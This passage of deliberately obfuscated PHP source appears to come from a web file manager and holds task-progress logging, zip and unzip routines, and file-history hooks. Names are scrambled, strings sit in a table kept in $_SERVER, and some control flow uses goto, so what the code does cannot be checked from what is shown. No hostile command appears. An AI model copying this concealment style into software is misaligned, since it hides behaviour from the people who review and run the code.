self::log($¿øİµÏ[2070] . $this->task[$¿øİµÏ[487]]); $this->end(); } public function progress($éá˜ü´, $Ğäƒ‚Ìù, $‡ÁœñŠ, $ãØŠõÍš, $Şå«×Øù) { $¤»˜Åò² =& $_SERVER[ïÃ°£«Ê]; $ÇÑ‹ÚÍ =& $this->task; if ($Şå«×Øù > 0) { $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]] = $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]] == 0 ? $ãØŠõÍš : $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]]; $ÇÑ‹ÚÍ[$¤»˜Åò²[1980]] = $Şå«×Øù; } else { if ($‡ÁœñŠ > 0) { $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]] = $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]] == 0 ? $Ğäƒ‚Ìù : $ÇÑ‹ÚÍ[$¤»˜Åò²[1234]]; $ÇÑ‹ÚÍ[$¤»˜Åò²[1980]] = $‡ÁœñŠ; } } $this->update(); self::log("\160\x72\157\x67\x72\145\x73\x73\110\x74\x74\160\x3a\144\157\x77\x6e\x3a{$‡ÁœñŠ}\57{$Ğäƒ‚Ìù}\x3b\x20\165\x70\154\x6f\141\144\x3a{$Şå«×Øù}\x2f{$ãØŠõÍš}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‹§ñÅåô, $•ÙØ´ = '', $ßÍ‘„Œ» = 0, $ğˆÜÌ = '') { $×¡‹˜ĞÎ =& $_SERVER[ïÃ°£«Ê]; $ğˆÜÌ = $ğˆÜÌ ? $ğˆÜÌ : ($•ÙØ´ ? $•ÙØ´ : $‹§ñÅåô); $ø“¾“Êõ = new Task($‹§ñÅåô, $•ÙØ´, $ßÍ‘„Œ», $ğˆÜÌ); $GLOBALS[$×¡‹˜ĞÎ[2071] . $‹§ñÅåô] = new TaskLog($×¡‹˜ĞÎ[1964], $ø“¾“Êõ, $ğˆÜÌ); return $ø“¾“Êõ; } public function __construct($‚…é¦øì = '', $‡ÏÉµ = '', $¿®õş±Û = '') { $øÑ¤àˆÑ =& $_SERVER[ïÃ°£«Ê]; if (!$‚…é¦øì) { $‚…é¦øì = $øÑ¤àˆÑ[1964]; } $¬Â¢òíæ = $‚…é¦øì . $øÑ¤àˆÑ[476] . rand_string(10); if (!$¿®õş±Û) { $¿®õş±Û = $‚…é¦øì . $øÑ¤àˆÑ[53] . $¿®õş±Û; } switch ($‚…é¦øì) { case $øÑ¤àˆÑ[1964]: if (!$‡ÏÉµ || !$‡ÏÉµ->task) { return echoLog($‚…é¦øì . $øÑ¤àˆÑ[2072]); } $’¨²¸İæ = $‡ÏÉµ; $¬Â¢òíæ = $’¨²¸İæ->task[$øÑ¤àˆÑ[487]]; $‚…é¦øì = $’¨²¸İæ->task[$øÑ¤àˆÑ[487]]; if (!$’¨²¸İæ->task[$øÑ¤àˆÑ[1869]]) { $’¨²¸İæ->task[$øÑ¤àˆÑ[1869]] = $¿®õş±Û ? $¿®õş±Û : $‚…é¦øì; } break; case $øÑ¤àˆÑ[2073]: if (!$‡ÏÉµ) { return echoLog($‚…é¦øì . $øÑ¤àˆÑ[2074]); } $¡Âï£®Á = is_string($‡ÏÉµ) ? array($‡ÏÉµ) : $‡ÏÉµ; $’¨²¸İæ = new TaskFileTransfer($¬Â¢òíæ, $‚…é¦øì, 0, $¿®õş±Û ? $¿®õş±Û : $¡Âï£®Á[0]); foreach ($¡Âï£®Á as $ğõ¬³ß­) { $’¨²¸İæ->addPath($ğõ¬³ß­); } break; case $øÑ¤àˆÑ[388]: if (!$‡ÏÉµ) { return echoLog($‚…é¦øì . $øÑ¤àˆÑ[2074]); } $¡Âï£®Á = is_string($‡ÏÉµ) ? array($‡ÏÉµ) : $‡ÏÉµ; $’¨²¸İæ = new TaskZip($¬Â¢òíæ, $‚…é¦øì, 0, $¿®õş±Û ? $¿®õş±Û : $¡Âï£®Á[0]); foreach ($¡Âï£®Á as $ğõ¬³ß­) { $’¨²¸İæ->addPath($ğõ¬³ß­); } break; case $øÑ¤àˆÑ[1406]: if (!$‡ÏÉµ) { return echoLog($‚…é¦øì . $øÑ¤àˆÑ[2074]); } $’¨²¸İæ = new TaskUnZip($¬Â¢òíæ, $‚…é¦øì, 0, $¿®õş±Û ? $¿®õş±Û : $‡ÏÉµ); if ($‡ÏÉµ) { $’¨²¸İæ->addFile($‡ÏÉµ); } break; case $øÑ¤àˆÑ[149]: $’¨²¸İæ = new TaskHttp($¬Â¢òíæ, $‚…é¦øì); break; default: return; break; } $this->task = $’¨²¸İæ; $this->taskID = $¬Â¢òíæ; Hook::bind($øÑ¤àˆÑ[2000], array($this, $øÑ¤àˆÑ[2075])); Hook::bind($øÑ¤àˆÑ[2002], array($this, $øÑ¤àˆÑ[2076])); Hook::bind($øÑ¤àˆÑ[1996], array($this, $øÑ¤àˆÑ[2077])); echoLog($øÑ¤àˆÑ[2078] . $’¨²¸İæ->task[$øÑ¤àˆÑ[1869]]); } public function __destruct() { $this->end(); } public function end($ˆ§õäÈò = '') { $ŠÇô¯¸‡ =& $_SERVER[ïÃ°£«Ê]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ˆ§õäÈò); $this->task = !1; $this->taskID = !1; Hook::unbind($ŠÇô¯¸‡[2000], array($this, $ŠÇô¯¸‡[2075])); Hook::unbind($ŠÇô¯¸‡[2002], array($this, $ŠÇô¯¸‡[2076])); Hook::unbind($ŠÇô¯¸‡[1996], array($this, $ŠÇô¯¸‡[2077])); } public function taskUpdate($ ·±’Æ¤) { $€ˆúâ—Û =& $_SERVER[ïÃ°£«Ê]; if (!$ ·±’Æ¤ || $this->taskID != $ ·±’Æ¤[$€ˆúâ—Û[487]]) { return; } $ªÃ˜éëë = 20; $ŒˆÛ±Õï = intval($ ·±’Æ¤[$€ˆúâ—Û[1981]] * $ªÃ˜éëë); $„¦ãôêº = $€ˆúâ—Û[173] . str_repeat($€ˆúâ—Û[464], $ŒˆÛ±Õï) . $€ˆúâ—Û[1182] . str_repeat($€ˆúâ—Û[53], $ªÃ˜éëë - $ŒˆÛ±Õï) . $€ˆúâ—Û[175]; $ÒÕàØÏï = $„¦ãôêº . sprintf($€ˆúâ—Û[2079], $ ·±’Æ¤[$€ˆúâ—Û[1981]] * 100) . $€ˆúâ—Û[2080]; $â¬ô¹¥ = $ÒÕàØÏï . $ ·±’Æ¤[$€ˆúâ—Û[1980]] . $€ˆúâ—Û[8] . $ ·±’Æ¤[$€ˆúâ—Û[1234]] . LNG($€ˆúâ—Û[2081]); $çµ“ŸË = $€ˆúâ—Û[12]; if ($ ·±’Æ¤[$€ˆúâ—Û[2065]]) { $â¬ô¹¥ = $ÒÕàØÏï . size_format($ ·±’Æ¤[$€ˆúâ—Û[1980]]) . $€ˆúâ—Û[8] . size_format($ ·±’Æ¤[$€ˆúâ—Û[1234]]); $çµ“ŸË = size_format($ ·±’Æ¤[$€ˆúâ—Û[1982]]) . $€ˆúâ—Û[2082]; } if ($ ·±’Æ¤[$€ˆúâ—Û[1236]]) { $ ·±’Æ¤[$€ˆúâ—Û[2031]] = $ ·±’Æ¤[$€ˆúâ—Û[1236]] . $€ˆúâ—Û[53] . $ ·±’Æ¤[$€ˆúâ—Û[2031]]; } if ($ ·±’Æ¤[$€ˆúâ—Û[2031]]) { $ıíÖÉ™ = $€ˆúâ—Û[12]; if ($ ·±’Æ¤[$€ˆúâ—Û[2033]]) { $ıíÖÉ™ = $€ˆúâ—Û[50] . size_format($ ·±’Æ¤[$€ˆúâ—Û[2034]]) . $€ˆúâ—Û[8] . size_format($ ·±’Æ¤[$€ˆúâ—Û[2033]]); } $çµ“ŸË .= $ ·±’Æ¤[$€ˆúâ—Û[2031]] . $ıíÖÉ™; } if ($ ·±’Æ¤[$€ˆúâ—Û[865]] && !$ ·±’Æ¤[$€ˆúâ—Û[2033]]) { $çµ“ŸË .= $€ˆúâ—Û[53] . size_format($ ·±’Æ¤[$€ˆúâ—Û[942]]) . $€ˆúâ—Û[8] . size_format($ ·±’Æ¤[$€ˆúâ—Û[865]]); } echoLog($â¬ô¹¥ . $€ˆúâ—Û[53] . $çµ“ŸË, !0); } public function taskEnd($ÂÔå¨©§) { $ëÆŠÖáÍ =& $_SERVER[ïÃ°£«Ê]; if (!$ÂÔå¨©§ || $this->taskID != $ÂÔå¨©§[$ëÆŠÖáÍ[487]]) { return; } $–Ùº­Œ½ = $ÂÔå¨©§ ? LNG($ëÆŠÖáÍ[2083]) . $ëÆŠÖáÍ[4] . $ÂÔå¨©§[$ëÆŠÖáÍ[1980]] . $ëÆŠÖáÍ[8] . $ÂÔå¨©§[$ëÆŠÖáÍ[1234]] . LNG($ëÆŠÖáÍ[2081]) . $ëÆŠÖáÍ[74] : $ëÆŠÖáÍ[12]; echoLog($ëÆŠÖáÍ[2084] . $ÂÔå¨©§[$ëÆŠÖáÍ[1869]] . ($ÂÔå¨©§[$ëÆŠÖáÍ[540]] ? $ëÆŠÖáÍ[74] . $ÂÔå¨©§[$ëÆŠÖáÍ[540]] : $ëÆŠÖáÍ[12]) . $ëÆŠÖáÍ[74] . $–Ùº­Œ½ . $ëÆŠÖáÍ[2085] . sprintf($ëÆŠÖáÍ[1009], timeFloat() - $ÂÔå¨©§[$ëÆŠÖáÍ[1983]]) . $ëÆŠÖáÍ[1995]); $this->end(); } public function taskKill($ı«¸É) { $Š¬ñî¾Î =& $_SERVER[ïÃ°£«Ê]; if (!$ı«¸É || $this->taskID != $ı«¸É[$Š¬ñî¾Î[487]]) { return; } echoLog($Š¬ñî¾Î[2086] . $ı«¸É[$Š¬ñî¾Î[1869]]); } } goto D”„ƒ”ñÅ±; Eñ¬¤æóÜ·: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÛÍ¶¥è; if ($ÛÍ¶¥è) { return $ÛÍ¶¥è; } $¾ÄğõÛå = IO::init($_SERVER[ïÃ°£«Ê][8]); return $¾ÄğõÛå; } private static function iconvSystem($©Âí¦º¹) { return self::local()->iconvSystem($©Âí¦º¹); } private static function iconvApp($¬ƒË¦Ş) { return self::local()->iconvApp($¬ƒË¦Ş); } public static function zipFolder($è¥Õ¾¥, $œ¼Ù„‘ = "\x7a\x69\x70", $ŠœµåÇ = '', $¯ÛÖÜ¾¬ = REPEAT_RENAME) { $°¹¢ûì =& $_SERVER[ïÃ°£«Ê]; $×ã›í®† = IO::listPath($è¥Õ¾¥); if (!$×ã›í®†) { return !1; } $×ã›í®† = array_merge($×ã›í®†[$°¹¢ûì[85]], $×ã›í®†[$°¹¢ûì[86]]); return self::zip($×ã›í®†, $œ¼Ù„‘, $ŠœµåÇ, $¯ÛÖÜ¾¬); } public static function zip($î À¾Ò°, $çã¨º¦¬ = "\x7a\151\160", $îÀö¦ŞÅ = '', $ÔÑŒˆœÍ = REPEAT_RENAME) { $Ìê÷½Ñ =& $_SERVER[ïÃ°£«Ê]; if (is_string($î À¾Ò°) && $î À¾Ò°) { $î À¾Ò° = array(array($Ìê÷½Ñ[87] => $î À¾Ò°)); } $ùÌê®Öš = self::init($î À¾Ò°[0][$Ìê÷½Ñ[87]]); $åÆá§Ã = self::info($î À¾Ò°[0][$Ìê÷½Ñ[87]]); $Ï—º¦ıÇ = $Ìê÷½Ñ[12]; $†õéˆÉ = $Ìê÷½Ñ[12]; $çÀ°¥ƒ­ = $Ìê÷½Ñ[12]; if ($îÀö¦ŞÅ && substr($îÀö¦ŞÅ, -1, 1) != $Ìê÷½Ñ[8]) { $†õéˆÉ = get_path_father($îÀö¦ŞÅ); $çÀ°¥ƒ­ = get_path_this($îÀö¦ŞÅ); } else { $†õéˆÉ = self::pathFather($åÆá§Ã[$Ìê÷½Ñ[87]]); $çÀ°¥ƒ­ = $åÆá§Ã[$Ìê÷½Ñ[32]] . $Ìê÷½Ñ[10] . $çã¨º¦¬; if (count($î À¾Ò°) > 1) { $ú†ÜÜ¸Ê = IO::info($†õéˆÉ); $çÀ°¥ƒ­ = $ú†ÜÜ¸Ê[$Ìê÷½Ñ[32]] . $Ìê÷½Ñ[10] . $çã¨º¦¬; } if ($îÀö¦ŞÅ) { $†õéˆÉ = $îÀö¦ŞÅ; } } if ($ùÌê®Öš->getType() == $Ìê÷½Ñ[106]) { $ı‘æˆ– = self::init($†õéˆÉ); $‘Ş ôÛ„ = $ı‘æˆ–->getType() == $Ìê÷½Ñ[106] ? $†õéˆÉ : get_path_father($ùÌê®Öš->path); $‘Ş ôÛ„ = IO::getPathInner($‘Ş ôÛ„); $‘Ş ôÛ„ = rtrim($‘Ş ôÛ„, $Ìê÷½Ñ[8]) . $Ìê÷½Ñ[8]; mk_dir($‘Ş ôÛ„); } else { $Ï—º¦ıÇ = TEMP_FILES . $Ìê÷½Ñ[1374] . time() . rand_string(8) . $Ìê÷½Ñ[8]; mk_dir($Ï—º¦ıÇ); file_put_contents($Ï—º¦ıÇ . $Ìê÷½Ñ[1375], $Ìê÷½Ñ[12]); $‘Ş ôÛ„ = $Ï—º¦ıÇ; } $•˜˜Àß = IO::info($‘Ş ôÛ„); if (!$•˜˜Àß || !$•˜˜Àß[$Ìê÷½Ñ[233]]) { show_json(LNG($Ìê÷½Ñ[1376]), !1); } $˜Ûğâø› = self::zipFileList($î À¾Ò°, $Ï—º¦ıÇ); foreach ($˜Ûğâø› as $»İ›¸¥Ú => $ÒÎ¥æ·) { $˜Ûğâø›[$»İ›¸¥Ú] = self::iconvSystem($ÒÎ¥æ·); } $á¥õ´ëÅ = get_filename_auto($‘Ş ôÛ„ . $çÀ°¥ƒ­, $Ìê÷½Ñ[12], $ÔÑŒˆœÍ); KodArchive::create(self::iconvSystem($á¥õ´ëÅ), $˜Ûğâø›); if (!IO::exist($á¥õ´ëÅ)) { if ($Ï—º¦ıÇ) { del_dir($Ï—º¦ıÇ); } write_log($Ìê÷½Ñ[1377] . $á¥õ´ëÅ, $Ìê÷½Ñ[388]); show_json(LNG($Ìê÷½Ñ[1378]), !1); } if (!$Ï—º¦ıÇ) { return $á¥õ´ëÅ; } $ôşêÏÀô = self::move($á¥õ´ëÅ, $†õéˆÉ, $ÔÑŒˆœÍ); if ($Ï—º¦ıÇ) { del_dir($Ï—º¦ıÇ); } if (!$á¥õ´ëÅ) { write_log($Ìê÷½Ñ[1379] . $á¥õ´ëÅ . $Ìê÷½Ñ[1380] . $†õéˆÉ, $Ìê÷½Ñ[388]); show_json(LNG($Ìê÷½Ñ[1378]), !1); } return $ôşêÏÀô; } public static function unzip($Ùü˜ç·…, $¹êÛÅíİ, $ÌõéÔœ = "\55\61", $úÏ“Ï»Ú = "\162\145\x70\154\x61\x63\x65") { $È¸ÀøÉŒ =& $_SERVER[ïÃ°£«Ê]; $Ç¡å = parent::info($Ùü˜ç·…); if (!$Ç¡å) { show_json(LNG($È¸ÀøÉŒ[1381]), !1); } $¶»¨Œ = IO::infoFullSimple($¹êÛÅíİ); if (!$¶»¨Œ) { $¹êÛÅíİ = IO::mkdir($¹êÛÅíİ); } if (isset($¶»¨Œ[$È¸ÀøÉŒ[191]]) && trim($¶»¨Œ[$È¸ÀøÉŒ[87]], $È¸ÀøÉŒ[8]) != trim($¹êÛÅíİ, $È¸ÀøÉŒ[8])) { $ÕêµÒ€ˆ = KodIO::make($¶»¨Œ[$È¸ÀøÉŒ[190]]); $‚úËšè = IO::fileNameAuto($ÕêµÒ€ˆ, $¶»¨Œ[$È¸ÀøÉŒ[32]], REPEAT_RENAME_FOLDER, !0); $¹êÛÅíİ = IO::mkdir($ÕêµÒ€ˆ . $‚úËšè); } $ÌõéÔœ = $ÌõéÔœ && $ÌõéÔœ != $È¸ÀøÉŒ[1382] ? @json_decode($ÌõéÔœ, !0) : -1; $Íòñ¼ = self::unzipPart($Ùü˜ç·…, $ÌõéÔœ); if (!$Íòñ¼ || !IO::exist($Íòñ¼[$È¸ÀøÉŒ[230]])) { show_json(LNG($È¸ÀøÉŒ[105]), !1); } $Ï‘úãñÔ = $Íòñ¼[$È¸ÀøÉŒ[1383]][count($Íòñ¼[$È¸ÀøÉŒ[1383]]) - 1]; if ($Ï‘úãñÔ[$È¸ÀøÉŒ[1311]] == -1 || substr($Ï‘úãñÔ[$È¸ÀøÉŒ[32]], -1, 1) == $È¸ÀøÉŒ[8]) { $¤—ôèèÚ = $Íòñ¼[$È¸ÀøÉŒ[1384]] . rand_string(10) . $È¸ÀøÉŒ[8]; mk_dir($¤—ôèèÚ); $ƒôò˜„€ = count($Íòñ¼[$È¸ÀøÉŒ[1383]]) == 1 ? IO::ext($Ùü˜ç·…) : get_path_ext($Íòñ¼[$È¸ÀøÉŒ[230]]); $©œº© ¾ = KodArchive::extract(self::iconvSystem($Íòñ¼[$È¸ÀøÉŒ[230]]), $¤—ôèèÚ, $Ï‘úãñÔ[$È¸ÀøÉŒ[1311]], $‚úËšè, $ƒôò˜„€); self::unzipErrorCheck($©œº© ¾, array($È¸ÀøÉŒ[1385], $Ùü˜ç·…, $ƒôò˜„€, $¹êÛÅíİ, $Íòñ¼)); Hook::trigger($È¸ÀøÉŒ[1386], $¤—ôèèÚ); recursion_dir($¤—ôèèÚ, $µ—“Ø‚î, $ä¨ğ¡Í†, 0); $¢İÚÏòÌ = array_merge($µ—“Ø‚î, $ä¨ğ¡Í†); $©åúåÍ = array(); foreach ($¢İÚÏòÌ as $¥ë†Ôı—) { $ğøç™¨ = IO::move(self::iconvApp($¥ë†Ôı—), $¹êÛÅíİ, $úÏ“Ï»Ú); if ($ğøç™¨) { $©åúåÍ[] = $ğøç™¨; } } del_dir($¤—ôèèÚ); } else { $ğøç™¨ = IO::move($Íòñ¼[$È¸ÀøÉŒ[230]], $¹êÛÅíİ, $úÏ“Ï»Ú, get_path_this($Ï‘úãñÔ[$È¸ÀøÉŒ[32]])); if ($ğøç™¨) { $©åúåÍ[] = $ğøç™¨; } } return $©åúåÍ ? $©åúåÍ : !1; } public static function unzipList($±€ıÆğ) { $©²”ãè =& $_SERVER[ïÃ°£«Ê]; $ëñëşçö = isset($±€ıÆğ[$©²”ãè[1387]]) ? $±€ıÆğ[$©²”ãè[1387]] : !1; $Ğ«¡Êåã = isset($±€ıÆğ[$©²”ãè[1311]]) ? @json_decode($±€ıÆğ[$©²”ãè[1311]], !0) : -1; $ŠÙœÛ = self::unzipPart($±€ıÆğ[$©²”ãè[87]], $Ğ«¡Êåã); if (!$ŠÙœÛ || !IO::exist($ŠÙœÛ[$©²”ãè[230]])) { show_json(LNG($©²”ãè[105]), !1); } $…‡´§Äõ = $ŠÙœÛ[$©²”ãè[1383]][count($ŠÙœÛ[$©²”ãè[1383]]) - 1]; $›ì©áÊ = in_array(IO::ext($ŠÙœÛ[$©²”ãè[230]]), array($©²”ãè[388], $©²”ãè[1388], $©²”ãè[1389], $©²”ãè[1390], $©²”ãè[1391], $©²”ãè[1392])); if (!$ëñëşçö && ($…‡´§Äõ[$©²”ãè[1311]] == -1 || $›ì©áÊ)) { $œÀò¿Ü = $ŠÙœÛ[$©²”ãè[1384]] . get_path_this($ŠÙœÛ[$©²”ãè[230]]) . $©²”ãè[961]; if (!IO::exist($œÀò¿Ü)) { $åãË¢´ = $…‡´§Äõ[$©²”ãè[1311]] == -1 ? get_path_ext(IO::pathThis($±€ıÆğ[$©²”ãè[87]])) : get_path_ext($ŠÙœÛ[$©²”ãè[230]]); $ÌËÀ›°• = KodArchive::listContent(self::iconvSystem($ŠÙœÛ[$©²”ãè[230]]), !0, $åãË¢´); self::unzipErrorCheck($ÌËÀ›°•, array($©²”ãè[1393], $±€ıÆğ, $ŠÙœÛ)); @file_put_contents($œÀò¿Ü, json_encode($ÌËÀ›°•[$©²”ãè[1394]])); } return @json_decode(IO::getContent($œÀò¿Ü), !0); } IO::fileOut($ŠÙœÛ[$©²”ãè[230]], $ëñëşçö, get_path_this($…‡´§Äõ[$©²”ãè[32]])); die; } private static function zipFileList($Ã«ÕŞ·‚, $ÕÏâÉ“ = false) { $—Œ¹ŒÖæ =& $_SERVER[ïÃ°£«Ê]; $­ÂÃÌõ = array(); foreach ($Ã«ÕŞ·‚ as $·å…ßôÊ) { $üùå½£Ç = $·å…ßôÊ[$—Œ¹ŒÖæ[87]]; if ($ÕÏâÉ“) { $üùå½£Ç = self::copy($·å…ßôÊ[$—Œ¹ŒÖæ[87]], $ÕÏâÉ“, $—Œ¹ŒÖæ[928]); } else { $Å‚İ¾—§ = self::init($·å…ßôÊ[$—Œ¹ŒÖæ[87]]); if ($Å‚İ¾—§->getType() == $—Œ¹ŒÖæ[106]) { $üùå½£Ç = $Å‚İ¾—§->path; } } if ($üùå½£Ç && self::local()->exist($üùå½£Ç)) { $­ÂÃÌõ[$·å…ßôÊ[$—Œ¹ŒÖæ[87]]] = $üùå½£Ç; } } if (!empty($­ÂÃÌõ)) { return array_values($­ÂÃÌõ); } show_json(LNG($—Œ¹ŒÖæ[1353]), !1); } private static function localFilePath($ Ä˜ì‹é) { $±œìÔƒ¨ =& $_SERVER[ïÃ°£«Ê]; $­öïŠ›ç = KodIO::parse($ Ä˜ì‹é); if ($­öïŠ›ç[$±œìÔƒ¨[33]] == KodIO::KOD_SOURCE) { $—‡·ªæ = Model($±œìÔƒ¨[934])->fileInfoGet(KodIO::sourceID($ Ä˜ì‹é)); if (!$—‡·ªæ[$±œìÔƒ¨[87]]) { show_json($±œìÔƒ¨[1395], !1); } $ Ä˜ì‹é = $—‡·ªæ[$±œìÔƒ¨[87]]; } $”¸›ÁÒ = self::init($ Ä˜ì‹é); if ($”¸›ÁÒ->pathParse[$±œìÔƒ¨[1339]]) { $ Ä˜ì‹é = $”¸›ÁÒ->pathParse[$±œìÔƒ¨[1339]]; $”¸›ÁÒ = self::init($ Ä˜ì‹é); } $¹´£·¹‰ = $”¸›ÁÒ->getType(); if ($¹´£·¹‰ == $±œìÔƒ¨[106] || $¹´£·¹‰ == $±œìÔƒ¨[1396]) { if (!$”¸›ÁÒ->exist($”¸›ÁÒ->path)) { show_json(LNG($±œìÔƒ¨[105]), !1); } return $”¸›ÁÒ->path; } return !1; } public static function unzipPart($˜ò™äÚÆ, $­“ŠÖÁË = -1) { $åõ–™İß =& $_SERVER[ïÃ°£«Ê]; $Öúä—¤° = IO::pathThis($˜ò™äÚÆ); if (!$­“ŠÖÁË || $­“ŠÖÁË == -1) { $€ˆÓî×° = array(array($åõ–™İß[32] => $Öúä—¤°, $åõ–™İß[1311] => -1)); $€ˆÓî×°[0][$åõ–™İß[1397]] = $€ˆÓî×°[0][$åõ–™İß[32]]; } else { if (is_array($­“ŠÖÁË)) { $€ˆÓî×° = $­“ŠÖÁË; $Ü‘Øêç­ = count($€ˆÓî×°) - 1; for ($Ì·Ö¨Óñ = 0; $Ì·Ö¨Óñ <= $Ü‘Øêç­; $Ì·Ö¨Óñ++) { $ì­µÎ¿§ = $€ˆÓî×°[$Ì·Ö¨Óñ]; $å°‰´¦Ö = get_path_this($ì­µÎ¿§[$åõ–™İß[32]]) . (checkExtSafe($ì­µÎ¿§[$åõ–™İß[32]]) ? $åõ–™İß[12] : $åõ–™İß[1398]); $€ˆÓî×°[$Ì·Ö¨Óñ][$åõ–™İß[1397]] = $åõ–™İß[1399] . intval($ì­µÎ¿§[$åõ–™İß[1311]]) . $åõ–™İß[476] . $å°‰´¦Ö; if ($Ì·Ö¨Óñ == 0) { continue; } $€ˆÓî×°[$Ì·Ö¨Óñ][$åõ–™İß[1397]] = $€ˆÓî×°[$Ì·Ö¨Óñ - 1][$åõ–™İß[1397]] . $åõ–™İß[1400] . $€ˆÓî×°[$Ì·Ö¨Óñ][$åõ–™İß[1397]]; } } } if (!is_array($€ˆÓî×°) || count($€ˆÓî×°) == 0) { return !1; } $‚üÇµñ« = $€ˆÓî×°[count($€ˆÓî×°) - 1]; if (!IO::exist($˜ò™äÚÆ)) { return !1; } $İ”ù¢êè = TEMP_FILES . $åõ–™İß[1401] . kodIO::hashPathSafe($˜ò™äÚÆ) . $åõ–™İß[8]; $Éš€Ô‚ú = $İ”ù¢êè . $‚üÇµñ«[$åõ–™İß[1397]]; mk_dir($İ”ù¢êè); file_put_contents(TEMP_FILES . $åõ–™İß[1375], $åõ–™İß[12]); if (IO::exist($Éš€Ô‚ú)) { return array($åõ–™İß[230] => $Éš€Ô‚ú, $åõ–™İß[1383] => $€ˆÓî×°, $åõ–™İß[1384] => $İ”ù¢êè); } $âç¸µÁ = self::localFilePath($˜ò™äÚÆ); if (!$âç¸µÁ) { $âç¸µÁ = $İ”ù¢êè . $åõ–™İß[1402]; if (!IO::exist($âç¸µÁ)) { self::copy($˜ò™äÚÆ, $İ”ù¢êè, !1, get_path_this($âç¸µÁ)); } } if (!$âç¸µÁ || !IO::exist($âç¸µÁ)) { return !1; } if ($‚üÇµñ«[$åõ–™İß[1311]] == -1) { return array($åõ–™İß[230] => $âç¸µÁ, $åõ–™İß[1383] => $€ˆÓî×°, $åõ–™İß[1384] => $İ”ù¢êè); } $åËäµµ = $âç¸µÁ; foreach ($€ˆÓî×° as $Ì·Ö¨Óñ => $ì­µÎ¿§) { if (!$ì­µÎ¿§ || $ì­µÎ¿§[$åõ–™İß[1311]] == $åõ–™İß[1382]) { break; } if (substr($ì­µÎ¿§[$åõ–™İß[32]], -1, 1) == $åõ–™İß[8]) { break; } $î£Ã–” = in_array(get_path_ext($ì­µÎ¿§[$åõ–™İß[1397]]), array($åõ–™İß[388], $åõ–™İß[1388], $åõ–™İß[1389], $åõ–™İß[1390], $åõ–™İß[1391], $åõ–™İß[1392])); $Ô¾à¿Í = $Ì·Ö¨Óñ == count($€ˆÓî×°) - 1 && $î£Ã–”; $†¡µ¡ö = $İ”ù¢êè . $ì­µÎ¿§[$åõ–™İß[1397]]; $»ºÆ­æÓ = $İ”ù¢êè . get_path_this($ì­µÎ¿§[$åõ–™İß[32]]); if (IO::exist($†¡µ¡ö)) { $åËäµµ = $†¡µ¡ö; continue; } $¸²Œïòß = $Ì·Ö¨Óñ == 0 ? get_path_ext($Öúä—¤°) : get_path_ext($åËäµµ); $©ÒÈ«±Ó = KodArchive::extract(self::iconvSystem($åËäµµ), $İ”ù¢êè, $ì­µÎ¿§[$åõ–™İß[1311]], $Š¬ğãÂÒ, $¸²Œïòß); self::unzipErrorCheck($©ÒÈ«±Ó, array($åõ–™İß[1403], $˜ò™äÚÆ, $€ˆÓî×°, $ì­µÎ¿§, $†¡µ¡ö)); if (IO::exist($»ºÆ­æÓ)) { IO::rename($»ºÆ­æÓ, get_path_this($†¡µ¡ö)); } $åËäµµ = $†¡µ¡ö; } $Éš€Ô‚ú = $åËäµµ; return array($åõ–™İß[230] => $åËäµµ, $åõ–™İß[1383] => $€ˆÓî×°, $åõ–™İß[1384] => $İ”ù¢êè); } private static function unzipErrorCheck($˜­£‚ìè, $Ç¿ìŒ™ = false) { $Ú‰°Ú¸ =& $_SERVER[ïÃ°£«Ê]; if ($˜­£‚ìè[$Ú‰°Ú¸[1404]]) { return !0; } write_log(array($Ú‰°Ú¸[1405], $˜­£‚ìè, $Ç¿ìŒ™), $Ú‰°Ú¸[1406]); $âì‰ò‚ö = is_array($˜­£‚ìè[$Ú‰°Ú¸[1394]]) ? json_encode($˜­£‚ìè[$Ú‰°Ú¸[1394]]) : $˜­£‚ìè[$Ú‰°Ú¸[1394]]; show_json($Ú‰°Ú¸[1407] . $âì‰ò‚ö, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¡‚ÔÅ¿´ =& $_SERVER[ïÃ°£«Ê]; $ğœƒö¬¤ = $GLOBALS[$¡‚ÔÅ¿´[6]][$¡‚ÔÅ¿´[92]]; if ($ğœƒö¬¤[$¡‚ÔÅ¿´[1408]] != 1) { return; } if ($ğœƒö¬¤[$¡‚ÔÅ¿´[1409]] <= 0) { return; } if (isset($_REQUEST[$¡‚ÔÅ¿´[1410]]) && $_REQUEST[$¡‚ÔÅ¿´[1410]] == $¡‚ÔÅ¿´[91]) { return; } Hook::bind($¡‚ÔÅ¿´[1411], $¡‚ÔÅ¿´[1412]); Hook::bind($¡‚ÔÅ¿´[1413], $¡‚ÔÅ¿´[1414]); Hook::bind($¡‚ÔÅ¿´[1415], $¡‚ÔÅ¿´[1416]); Hook::bind($¡‚ÔÅ¿´[1417], $¡‚ÔÅ¿´[1418]); Hook::bind($¡‚ÔÅ¿´[1419], $¡‚ÔÅ¿´[1420]); Hook::bind($¡‚ÔÅ¿´[1421], $¡‚ÔÅ¿´[1422]); } public static function eventBeforeUpload($§İñ¨ª) { if ($§İñ¨ª[3] && $§İñ¨ª[3] != REPEAT_REPLACE) { return; } $½Á¾äÙ‰ = self::parsePath($§İñ¨ª[0]); if (!$½Á¾äÙ‰) { return; } self::add($½Á¾äÙ‰); } public static function eventBeforeEdit($÷Ì¬Òù–) { $¶ê¬É‚º = self::parsePath($÷Ì¬Òù–[0]); if (!$¶ê¬É‚º) { return; } self::add($¶ê¬É‚º); } public static function eventBeforeCopyFile($¤á–Öè—, $áû¹ŒÒ¶, $·¦À•ŞÀ, $Ô‡ÏË…Ö, $æ§Ó—Ïª, $•›ªØ¯Œ) { $îôÌş• =& $_SERVER[ïÃ°£«Ê]; if (isset($·¦À•ŞÀ->_data[$îôÌş•[1343]]) && $·¦À•ŞÀ->_data[$îôÌş•[1343]]) { return; } $Ùåûì”Ä = $·¦À•ŞÀ->getPathOuter($Ô‡ÏË…Ö); $Á×îü‰³ = self::parsePath($Ùåûì”Ä); if (!$Á×îü‰³) { return; } self::add($Á×îü‰³); } public static function eventBeforeRename($”µÎó²) { $Şºéñ© =& $_SERVER[ïÃ°£«Ê]; $óó¹£¦˜ = 